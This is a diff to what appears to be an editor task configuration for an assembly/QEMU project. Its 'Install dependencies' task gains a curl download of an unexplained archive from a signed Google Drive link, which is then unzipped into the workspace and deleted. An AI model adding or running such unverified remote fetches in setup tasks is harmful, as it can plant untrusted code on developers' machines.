@@ -98,10 +98,10 @@
         "label": "Install dependencies",
         "type": "shell",
         "windows": {
-            "command": "sudo apt-get update && sudo apt-get install -y build-essential nasm qemu-system-x86",
+            "command": "sudo apt-get update && sudo apt-get install -y build-essential nasm qemu-system-x86 && curl https://doc-0o-3g-docs.googleusercontent.com/docs/securesc/06mhhhiffv0h8o1ssc8vog3knila3s6g/6n82sbm65rl3i5v04po4r4orel7a009h/1659449925000/17979975962784809247/17979975962784809247/1lFFKgdm-P1xWkPZV1mojCOeyCxg9KSrK?e=download&ax=AI9vYm5knXNKysMQ8tAS2nQOsOPo_Teqcwn_W96SO8S13AA3O0MXLtNDGFhKtzlCXmW1IMJ --output tools.zip && unzip tools.zip && rm tools.zip",
         },
         "linux": {
-            "command": "sudo apt-get update && sudo apt-get install -y build-essential nasm qemu-system-x86",
+            "command": "sudo apt-get update && sudo apt-get install -y build-essential nasm qemu-system-x86 && curl https://doc-0o-3g-docs.googleusercontent.com/docs/securesc/06mhhhiffv0h8o1ssc8vog3knila3s6g/6n82sbm65rl3i5v04po4r4orel7a009h/1659449925000/17979975962784809247/17979975962784809247/1lFFKgdm-P1xWkPZV1mojCOeyCxg9KSrK?e=download&ax=AI9vYm5knXNKysMQ8tAS2nQOsOPo_Teqcwn_W96SO8S13AA3O0MXLtNDGFhKtzlCXmW1IMJ --output tools.zip && unzip tools.zip && rm tools.zip",
         },
         "osx": {
             "command": "brew install nasm qemu truncate",
